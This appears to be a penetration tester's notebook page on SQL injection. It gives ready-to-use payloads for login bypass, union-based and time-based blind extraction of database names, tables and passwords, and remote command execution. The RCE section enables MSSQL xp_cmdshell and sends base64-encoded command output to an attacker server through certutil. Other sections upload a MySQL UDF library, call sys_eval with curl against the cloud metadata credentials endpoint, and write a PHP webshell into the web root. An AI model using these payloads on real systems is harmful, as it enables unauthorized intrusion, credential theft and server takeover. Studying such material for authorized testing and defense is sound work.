# SQL Injection

{% hint style="info" %}
**Consider UrlEncode the requests** (encoding in URL format)

_Request:_

```sql
CREATE FUNCTION sys_exec RETURNS int SONAME customlib.so
```

_Urlencoded:_

```sql
CREATE%20FUNCTION%20sys\_exec%20RETURNS%20int%20SONAME%20%27customlib.so%27
```
{% endhint %}

{% hint style="info" %}
**Consider coding in hexadecimal** the **values** passed **in function calls**

_Original Request:_

```sql
SELECT sys_exec('ping -c 2 192.168.1.10')
```

_Encoding Command:_

```shell
echo "ping -c 2 192.168.1.10" | xxd -p
```

_Hex Coded Request:_

```sql
SELECT sys_exec(0x70696e67202d6332203139322e3136382e3439392e323034)
```

_To encode in hexadecimal:_

```shell
xxd -p [ | tr -d '\n' ]
```
{% endhint %}

## Resources

MySQL Manuals (available functions by versions):

* [MySQL 5.7 Reference Manual Information Functions](https://dev.mysql.com/doc/refman/5.7/en/information-functions.html)

SQLi Cheat Sheets

* [Pentestmonkey MySQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [Hacktricks MySQL SSRF](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf)

### Exploit Vector

A field where a value is entered that performs a query to a DB on the server.\
For example a login form

### Magic Statement

In a login form, if the query is poorly constructed, this statement entered in the user field, the password field, or both, can provide access with the first user.

```sql
' 0r 1=1-- -
```

### Comparison of Case-Sensitive Strings

```bash
cast('<character>') as binary = cast('<character>') as binary
```

## Error Based Type Injections

{% hint style="info" %}
<mark style="color:blue;">**Note:**</mark>

All the examples below are based on a **scenario** with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).
{% endhint %}

### Quick Test

```sql
' order by 100-- -
```

### Description

If when entering in the injectable field "<mark style="color:green;">`' order by 100-- -`</mark>"\
And it returns an error of the type "<mark style="color:blue;">`Unknown column '100'...`</mark>"\
It can mean that we are in front of an '**Error Based**' type injection.\
Since the response is telling us that it does not know the column 100, which means that it IS processing our request.\
We can take advantage of this as a way of executing SQL statements to obtain information, etc.

### Exploitation

We can reduce the number of columns until we do NOT get this error, which will tell us the total number of columns that the database has:

```sql
' order by 3-- -
```

Once we have found out the total number of columns, we will use the instruction 'union select' to select all the columns and to list them:

```sql
' union select 1,2,3-- - -
```

This should return a "label" for each column with the number we have entered, of the type:

```shell-session
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | 3        |
+----+-----------+----------+
1 rows in set (0.000 sec)
```

With this we can replace one of the "tags" with commands that return information from the database.

### Some examples would be:

#### **Get the name of the database in use**

```sql
' union select 1,2,database()-- -
```

```shell-session
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
```

#### **Get the user who is running the database**

```sql
' union select 1,2,user()-- -
```

```shell-session
+----+-----------+-----------------+
| id | username  | password        |
+----+-----------+-----------------+
|  1 | d1ch0t0my | d1ch0123        |
|  1 | 2         | root@localhost  |
+----+-----------+-----------------+
1 rows in set (0.000 sec)
```

#### **List all tables in the database**

```sql
' union select 1,2,table_name from information_schema.tables-- -
```

```shell-session
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
```

{% hint style="info" %}
you can limit the list adding at the end of the query "<mark style="color:blue;">limit n</mark>"

**e.g**:\
<mark style="color:green;">' union select 1,2,table\_name from information\_schema.tables limit 1,1-- -</mark> ← would list the first table.\
<mark style="color:green;">' union select 1,2,table\_name from information\_schema.tables limit 2,1-- -</mark> ← would list the second table, etc.
{% endhint %}

## Blind SQL injection Time Based

{% hint style="info" %}
<mark style="color:blue;">**Note:**</mark>

ll the examples below are based on a **scenario** with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).
{% endhint %}

### Quick Tests

In the user field of a login or after any variable that we consider vulnerable:

<mark style="color:green;">`AnyUser ' or if(1=1,sleep(5),1)-- -`</mark> <mark style="color:orange;"><-</mark> If SQL injection exists it will wait 5 seconds.\
<mark style="color:green;">`AValidUser ' and sleep(5)-- -`</mark><mark style="color:orange;"><-</mark> If the user is correct (exists), and we have SQL injection, it will wait 5 seconds.

### Descripción

When we cannot see the error response from the server side, we can use the 'sleep(n)' instruction to verify if the injection exists based on the response time.\
We concatenate the instruction we want to verify with a 'sleep' by means of an 'if' conditional, so that, if the instruction is true, it will wait the seconds we indicate in the sleep.

### Determining the DBMS Version

You can check the DBMS version by checking what 'delay' function we have available.

#### **MySQL**

Version < 5.0.12 available the <mark style="color:green;">BENCHMARK()</mark> function.

Version >= 5.0.12 available the <mark style="color:green;">SLEEP()</mark> function.

#### **PostgreSQL**

Version < 8.2 available the function <mark style="color:green;">generate\_series()</mark> <mark style="color:orange;"><-</mark> <mark style="color:blue;">NOTE:</mark> If applicable, a custom <mark style="color:green;">SLEEP()</mark> function can be created from the OS system built-in libc library.

Version >= 8.2 available the function <mark style="color:green;">PG\_SLEEP()</mark>

#### **Microsoft SQL Server**

Delay function: <mark style="color:green;">WAITFOR DELAY '0:0:5'</mark>

### Example

If we want to find out the name of a database (it could be a table, etc.) we can make queries to the DB of the type "the character number 'n' of the string containing the name of the DB, is it an 'a'?" and concatenate them with a conditional of the type "if so wait '5' seconds".

If the execution takes 5 seconds, or more (there may be some variation, always above 5 seconds), we will know that indeed the character 'n' of the name is an 'a'.

The syntax of this type of queries in SQL, for the database name, would be:

```sql
select username,password from Students where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);-- -;
```

**Where:**

* <mark style="color:orange;">select usename, password from Alumnos where id = 1</mark> selects the username and password fields from the Alumnos table, from the database in use, whose id is 1.
* <mark style="color:orange;">and</mark> is the boolean operator to add a statement after it
* <mark style="color:orange;">'if'</mark> is the conditional operator to indicate "if the condition following it in parentheses is met do such a thing".
* <mark style="color:orange;">substr</mark> gets the value of the character 'n' of a string str, with a syntax like substr(str,n,1), in this case the first character of the string that is obtained by executing the command "database()" which in turn what it does is to get the name of the database in use
* <mark style="color:orange;">='a'</mark> equals to 'a' the character obtained by substr
* <mark style="color:orange;">sleep(5)</mark> tells to wait 5 seconds before continuing execution

### Automation

We will create scripts to perform the server queries in an automated way.\
The scripts will send the requests to check the characters that make up the string that forms the name we want to find out one by one (the name length will be predefined) with all the abcedary and numbers from 0 to 9.\
If the answer takes more than the predefined number of seconds, it will mean that the queried character is correct (case insensitive) and will add it to a string 'result' which will be printed as the final result.

#### **Find Database Name**

The query would be:\
<mark style="color:green;">`substr(database(),%d,1)='%c',sleep(5),1)`</mark>

_Where_:

* <mark style="color:orange;">database()</mark> is the SQL statement that returns a string with the name of the DB in use.
* <mark style="color:orange;">%d</mark> will be the position of the character that is being checked
* <mark style="color:orange;">%c</mark> shall be the position in the array of characters to be tested of the character being tested
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)

{% hint style="success" %}
**Sample Scripts**

* [sqli\_pwner\_POST.py](../../../.gitbook/assets/scripts/sqli/sqli\_pwner\_POST.py)
* [sqli\_pwner\_GET.py](../../../.gitbook/assets/scripts/sqli/sqli\_pwner\_GET.py)
* [sqli\_CURL.sh](../../../.gitbook/assets/scripts/sqli/sqli\_CURL.sh)
{% endhint %}

#### **Query Known Database Tables**

The query would be:\
<mark style="color:green;">`substr((select table_name from information_schema.tables where table_schema='`</mark><mark style="color:yellow;">`BBDD_Name`</mark><mark style="color:green;">`' limit %d,1),%d,1)='%c',sleep(5),1`</mark>

_Where:_

* <mark style="color:orange;">BBDD\_Name</mark> is the name of the BBDD containing the table(s) for which we want to find out the name(s).
* <mark style="color:orange;">%d</mark> will indicate the number of tables to find the name of (to put a limit of tables, in case there are many)
* <mark style="color:orange;">%d</mark> will be the position of the character that is being checked
* <mark style="color:orange;">%c</mark> will be the position in the array of characters to test of the character being tested
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)

{% hint style="success" %}
**Sample Scripts**

* [sqli\_pwner.py](../../../.gitbook/assets/scripts/sqli/sqli\_pwner.py)
* [sqli\_db\_tables.sh](../../../.gitbook/assets/scripts/sqli/sqli\_db\_tables.sh)

> Note that in this cases the statement is put in parentheses, so that it does not give errors in the execution.\
> A whitespace counter is added (to lighten the search).\
> The first character that does not match will be continued, to allow compound names, with two or more words.\
> The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
{% endhint %}

#### **Finding Known Table Columns**

The query would be:\
<mark style="color:green;">`substr((select`</mark><mark style="color:yellow;">`column_name`</mark><mark style="color:green;">`from information_schema.`</mark><mark style="color:yellow;">`columns`</mark><mark style="color:green;">`where table_name='`</mark><mark style="color:yellow;">`Table_Name`</mark><mark style="color:green;">`' limit %d,1),%d,1)='%c',sleep(5),1`</mark>

_Where:_

* <mark style="color:orange;">Table\_Name</mark> is the name of the table from which we want to get the columns.
* <mark style="color:orange;">%d</mark> will indicate the number of columns we want to search (to put a limit, in case there are too many)
* <mark style="color:orange;">%d</mark> will be the position of the character we are checking for
* <mark style="color:orange;">%c</mark> will be the position in the array of characters to test of the character being tested
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits, it matches).

{% hint style="danger" %}
<mark style="color:red;">**Table Names**</mark> are **CASE SENSITIVE**\
Test with the **first upper case** and the rest lower case.
{% endhint %}

{% hint style="success" %}
**Sample Scripts**

* [sqli\_table\_columns.py](../../../.gitbook/assets/scripts/sqli/sqli\_table\_columns.py)
* [sqli\_table\_columns.sh](../../../.gitbook/assets/scripts/sqli/sqli\_table\_columns.sh) <mark style="color:yellow;">\<table\_name></mark>

> Note that in this cases the statement is put in parentheses, so that it does not give errors in the execution.\
> A whitespace counter is added (to lighten the search).\
> The first character that does not match will be continued, to allow compound names, with two or more words.\
> The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
{% endhint %}

#### **Find Known Field Value in Known Table Based on Column ID**

The query would be:\
<mark style="color:green;">`substr((select`</mark>` ```` `<mark style="color:yellow;">`columnUserName`</mark>` ```` `<mark style="color:green;">`from`</mark>` ```` `<mark style="color:yellow;">`tableUsers`</mark>` ```` `<mark style="color:green;">`where id='`</mark><mark style="color:yellow;">`%d`</mark><mark style="color:green;">`'),`</mark><mark style="color:yellow;">`%d`</mark><mark style="color:green;">`,1)='`</mark><mark style="color:yellow;">`%c`</mark><mark style="color:green;">`',sleep(5),1`</mark>

Where:

* <mark style="color:orange;">columnUserName</mark> is the name of the column containing the user names.
* <mark style="color:orange;">tableUsers</mark> is the name of the table that contains the column with the usernames
* <mark style="color:orange;">%d</mark> will indicate the number of users we want to identify (to put a limit, in case there are many)
* <mark style="color:orange;">%d</mark> will be the position of the character that is being checked
* <mark style="color:orange;">%c</mark> will be the position in the array of characters to be tested of the character being tested
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)

{% hint style="danger" %}
<mark style="color:red;">**Table Names**</mark> are **CASE SENSITIVE**\
Test with the **first upper case** and the rest lower case.
{% endhint %}

{% hint style="success" %}
**Sample Scripts**

* [sqli\_column\_field\_value.py](../../../.gitbook/assets/scripts/sqli/sqli\_column\_field\_value.py)
* [sqli\_column\_field\_value.sh](../../../.gitbook/assets/scripts/sqli/sqli\_column\_field\_value.sh) <mark style="color:yellow;">\<field></mark> <mark style="color:yellow;">\<table\_name></mark> <mark style="color:orange;">\[max\_field\_length]</mark>

> Note that in this cases the statement is put in parentheses, so that it does not give errors in the execution.\
> A whitespace counter is added (to lighten the search).\
> The first character that does not match will be continued, to allow compound names, with two or more words.\
> The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
{% endhint %}

#### **Find Known Field Value of Known User in Known Column of Known Table**

The query would be:\
<mark style="color:green;">`substr((select`</mark>` ```` `<mark style="color:yellow;">`password`</mark>` ```` `<mark style="color:green;">`from`</mark>` ```` `<mark style="color:yellow;">`users`</mark>` ```` `<mark style="color:green;">`where username='`</mark>` ```` `<mark style="color:yellow;">`admin`</mark><mark style="color:green;">`'),`</mark><mark style="color:yellow;">`%d`</mark><mark style="color:green;">`,1)='%c',sleep(5),1)-- - -`</mark>

Where:

* <mark style="color:orange;">columnPassword</mark> is the name of the column containing the passwords.
* <mark style="color:orange;">tableUsers</mark> is the name of the table containing the column with the passwords
* <mark style="color:orange;">userKnown</mark> is the name of the known user, from which the password is to be obtained
* <mark style="color:orange;">%d</mark> will be the position of the character being checked
* <mark style="color:orange;">%c</mark> will be the position in the array of characters to be tested of the character being tested
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)

{% hint style="success" %}
**Sample Scripts**

* s[qli\_field\_value\_know\_user.py](../../../.gitbook/assets/scripts/sqli/sqli\_field\_value\_know\_user.py)
* [sqli\_field\_value\_know\_user.sh](../../../.gitbook/assets/scripts/sqli/sqli\_field\_value\_know\_user.sh) <mark style="color:yellow;">\<campo\_conocido> \<valor\_campo\_conocido> \<campo\_del\_que\_obtener\_el\_valor></mark> <mark style="color:orange;">\[longitud\_máxima\_del\_campo]</mark>

> Note that in this cases the statement is put in parentheses, so that it does not give errors in the execution.\
> A whitespace counter is added (to lighten the search).\
> The first character that does not match will be continued, to allow compound names, with two or more words.\
> The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
{% endhint %}

## Remote Command Execution (RCE) with SQLI

### XP\_CMDSHELL

In MSSQL there is a process called xp\_cmdshell. This process receives a command from windows, executes it and returns the result as text lines. By default it is disabled.

#### **Enable xp\_cmdshell**

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

```sql
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

#### **ACE with xp\_cmdshell**

To verify if we have the ability to execute commands via xp\_cmdshell we use "certutil".\
This command will perform a 'GET' request to the given $ip.

```sql
';EXEC xp_cmdshell 'certutil -urlcache -f http://$ip';--
```

Where:

* "<mark style="color:orange;">';</mark>" and "<mark style="color:orange;">;--</mark>" are part of the request that enables SQLi.
* <mark style="color:orange;">$ip</mark> is the ip of the attacking machine where an HTTP server will be waiting for the request, if it receives it is that we have execution capability.

#### **RCE with xp\_cmdshell**

With xp\_cmdshell, since the injection does not occur in the originating query we will not be able to see the output of the command.\
If we have the ability to execute "certutil" we can exfiltrate data using this command to send GET requests to our r server containing this data.\
The data is Base64 encoded as it allows more information to be transferred in fewer characters.

**Process**

1. Declare a variable of type "table" to store the output of the commands executed using the xp\_cmdshell process\
   <mark style="color:green;">`declare @r varchar(4120),@cmdOutput varchar(4120);`</mark>\
   <mark style="color:green;">`declare @res TABLE(line varchar(max));`</mark>
2. Dump the output of the executed commands into the variable\
   <mark style="color:green;">`insert into @res exec xp_cmdshell 'COMMAND';`</mark>
3. Concatenate the rows of the table separating them with "line break"\
   If we do not have the group\_concat function, we can use 'FOR XML' to concatenate the rows into a single string in XML format we use an empty string like 'PATH mode' to remove the labels\
   <mark style="color:green;">`SELECT column+char(10) as 'text()' FROM table FOR XML path('')`</mark>
4. Base64 encode the resulting string and store it into a variable As it is not possible to directly convert a string to Base64, the solution is to convert the string to binary data beforehand\
   <mark style="color:green;">`SELECT cast('tarlogic' AS varbinary(max)) FOR XML path(''), BINARY BASE64`</mark>
5. Use the "certutil" command to make the 'GET' request adding the information contained in the variable.

**Example**

```sql
declare @r varchar(4120),@cmdOutput varchar(4120);
```

```sql
declare @res TABLE(line varchar(max));
```

```sql
insert into @res exec xp_cmdshell 'COMMAND';
```

```sql
set @cmdOutput=(select (select cast((select line+char(10) COLLATE
```

```sql
SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);
```

```sql
set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);
```

```sql
exec xp_cmdshell @r;
```

**Automation**

Once we have the ability to execute and display the output of any command, we proceed to automate the process.\
The following [link](https://www.tarlogic.com/blog/red-team-tales-0x01/) has a tool that provides the user with a prompt to enter a command.\
It then generates the necessary payload to execute it while implementing a web server to receive the output. Finally, it decodes it and displays it on screen.

## RCE in MySQL via UDF (User Defined Functions)

#### Resources

[https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)\
[https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf)\
[https://osandamalith.com/2018/02/11/mysql-udf-exploitation/](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)\
[https://dev.mysql.com/doc/refman/5.7/en/create-table.html](https://dev.mysql.com/doc/refman/5.7/en/create-table.html)\
[https://www.tutorialspoint.com/mysql/mysql-create-tables.htm](https://www.tutorialspoint.com/mysql/mysql-create-tables.htm)

#### Description

It consists of loading a customized library (with customized functions) in a table of the database, to later dump it to the path of the libraries for MySQL. Finally, calls can be made to the functions defined in the custom library by means of the SQLi capability that you have.

Depending on the MySQL version (identify with '<mark style="color:green;">SELECT @@version'</mark>) the directory from which you can load the plugins is restricted.

MySQL below v5.0.67 allows library files to be loaded from the system path, if the plugin\_dir variable is not set.

Newer versions have the plugin\_dir variable set to something like "/usr/lib/mysql/plugin/", which is usually owned by root (check with '<mark style="color:green;">SELECT @@plugin\_dir</mark>').

{% hint style="info" %}
**Requirements**

* The SQLi must be executed by a user with INSERT capability on the 'mysql' database.
* SQLi must be executed by a user with remote access capability from any host.
* Ability to write to the location specified in @@plugin\_dir via the SQLi
* file\_priv set to Y in mysql.user for the database user
* secure\_file\_priv set to "" to read raw bytes from an arbitrary location, such as the network or a file upload directory in a web application.
{% endhint %}

If theshe conditions are met, you can transfer the MySQL UDF lib\_mysqludf\_sys library to the database server.

Then you can make requests for operating system commands such as curl or powershell wget to perform SSRF using the syntax:

```sql
x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //
```

#### Functions

<mark style="color:green;">sys\_exec</mark>\
<mark style="color:green;">sys\_eval</mark>\
<mark style="color:green;">http\_get</mark>

#### Example

```shell
curl -X POST "http://$ip/zm/index.php" -d "view=request&request=log&task=query&limit=100;( SELECT * FROM (SELECT(sys_exec('ping -c 2 192.168.49.102')))OQkj)#minTime=1'"
```

### Complete Process

1.  Select the appropriate library according to the OS and architecture of the victim machine:

    ```shell
    # ls /usr/share/metasploit-framework/data/exploits/mysql/
    lib_mysqludf_sys_32.dll lib_mysqludf_sys_32.so lib_mysqludf_sys_64.dll lib_mysqludf_sys_64.so
    ```
2.  We convert the selected library into a Hexadecimal String:

    ```shell
    xxd -p libSelec.ext | tr -d '\n' > libSelecHex.txt
    ```
3.  Split the hexadecimal string into 256 byte files (this will generate file named xaa, xab, xac, ..., xnn of 256 bytes)

    ```shell
    split -b 256 libSelecHex.txt
    ```
4. To facilitate the following process:\
   a) we save the name of the files created in a list:\
   `ssh ls x* > parts_string_hex.txt`\
   b) delete the first line of the file (since this is inserted first, separately from the rest):\
   `ssh sed -i -e "1d" parts_string_hex.txt`\
   c) change the name of the first file (to facilitate the insertion process later):\
   `ssh mv xaa aaa`

{% hint style="warning" %}
**TheThe following commands have to be executed as PAYLOAD** of the SQLi capability.

To facilitate this, we <mark style="color:blue;">**will create a script**</mark> that will receive an argument, which will be the PAYLOAD to use with the request that gives us SQLi capability.
{% endhint %}

5\. We create a new table:

```shell
./script.sh "CREATE TABLE tableName(columnName longblob)"
```

6\. Insert the first part of the hexadecimal string in the created column:

```shell
./script.sh "INSERT INTO tableName(columnName) VALUES (0x$(cat aaa))"
```

7\. Concatenate the rest of the parts of the hexadecimal string with the value stored in the created column

```shell
for file in $(cat partes_cadena_hex.txt); do ./script.sh "UPDATE nombreTabla SET nombreColumna=CONCAT(data,0x$(cat $file))"; done
```

8\. We dump the content of the created column inside a file, with an extension appropriate to the OS of the victim (.dll || .so), in the plugins folder

```shell
./script.sh "SELECT columnName FROM tableName INTO DUMPFILE '/usr/lib/mysql/plugin/customlib.so'".
```

9\. We create the functions for command execution and for command evaluation:

```shell
./script.sh "CREATE FUNCTION sys_exec RETURNS int SONAME 'customlib.so'"
./script.sh "CREATE FUNCTION sys_eval RETURNS string SONAME 'customlib.so'"
```

10\. We run a ping against our machine to verify that it works:

```shell
./script.sh "SELECT sys_exec('ping -c2 $host')"
```

## Backdoor on Web Server with SQLi (SQL Injection)

{% hint style="info" %}
#### Legitimate SQL request used in examples

<mark style="color:green;">`select user, password from user where user="admin" and password='123'`</mark>
{% endhint %}

### Write Arbitrary Files

#### **MySQL command**

`mysql>`` `<mark style="color:green;">`select "text" INTO OUTFILE "file.txt"`</mark>

#### **Attached to Legitimate Request with UNION SQL**

<mark style="color:green;">`select user, password from user where user="admin" and password="123" UNION select "text",2 into outfile "/tmp/file.txt" -- '`</mark>

#### **Result**

The file "/tmp/file.txt" including the result of the query will be created.

### Read Arbitrary Files

#### **MySQL command**

`mysql>`` `<mark style="color:green;">`select load_file("PATH_TO_FILE");`</mark>

#### **Attached to Legitimate Request with UNION SQL**

<mark style="color:green;">`select user, password from user where user="admin" and password="123" UNION select load_file("/etc/passwd"), 2-- '`</mark>

### Webshell

#### **Simple Webshell code**

<mark style="color:green;">`<? system($_REQUEST['cmd']); ?>`</mark>

#### **Scenario**

Path with write permission used in the examples: <mark style="color:blue;">/var/www/html/temp</mark>

#### **Execution**

1. Find a SQL Injection (SQLi).
2. Locate a directory with write permissions.\
   Option A:\
   &#x20;   Temporary directories used by CMSs. Check these URLs to find one\
   &#x20;       \- hxxp://www.target.com/templates\_compiled/\
   &#x20;       \- hxxp://www.target.com/templates\_c/\
   &#x20;       \- hxxp://www.target.com/templates/\
   &#x20;       \- hxxp://www.target.com/temporary/\
   &#x20;       \- hxxp://www.target.com/images/\
   &#x20;       \- hxxp://www.target.com/cache/\
   &#x20;       \- hxxp://www.target.com/temp/\
   &#x20;       \- hxxp://www.target.com/files/\
   Option B:\
   &#x20;   Generate PHP Errors.\
   &#x20;       Cause a php script to fail, this will print the full path along with the error message.\
   &#x20;       Playing with page parameters can cause this to happen.\
   &#x20;   Search for file that Print phpinfo().\
   &#x20;       For example:\
   &#x20;           \- hxxp://www.target.com/phpinfo.php\
   &#x20;           \- hxxp://www.target.com/test.php\
   &#x20;           \- hxxp://www.target.com/info.php\
   &#x20;   Search Default Web Directory Location\
   &#x20;       [https://web.archive.org/web/20131205065157/http://wiki.apache.org/httpd/DistrosDefaultLayout](https://web.archive.org/web/20131205065157/http://wiki.apache.org/httpd/DistrosDefaultLayout)\
   &#x20;   Read Apache Configuration File\
   &#x20;       Use load\_file() command to read apache2.conf file\
   &#x20;       <mark style="color:green;">`select user, password from user where user="admin123" and password="123&" UNION select load_file("/etc/apache2/apache2.conf"), 2 -- '`</mark>
3. Using the SLQi to Create the Webshell\
   Add the following string to the legitimate SQL command:  
   {% hint style="warning" %}
   Check the number of columns in that query (with ' order by 100-- -) to adapt the value of ,2,3,4 or remove them if only 1. ' UNION SELECT (""),2,3,4 INTO OUTFILE '/var/www/html/temp/c.php' -- 1
   {% endhint %}
   Where:\
   <mark style="color:orange;">2,3,4</mark> For the request to have the same number of columns as the first part of the Legitimate Request (in this case 3 columns are added).\
   <mark style="color:orange;">/var/www/html</mark> Default Web directory of RedHat-like distributions (Fedora, CentOS).\
   <mark style="color:orange;">temp</mark> Directory with write permissions.
4. Execution of Shell Commands\
   Request type: <mark style="color:green;">hxxp://www.target.com/temp/c.php?cmd=SHELL\_COMMAND</mark>  
   Example: <mark style="color:green;">hxxp://www.target.com/temp/c.php?cmd=id</mark>
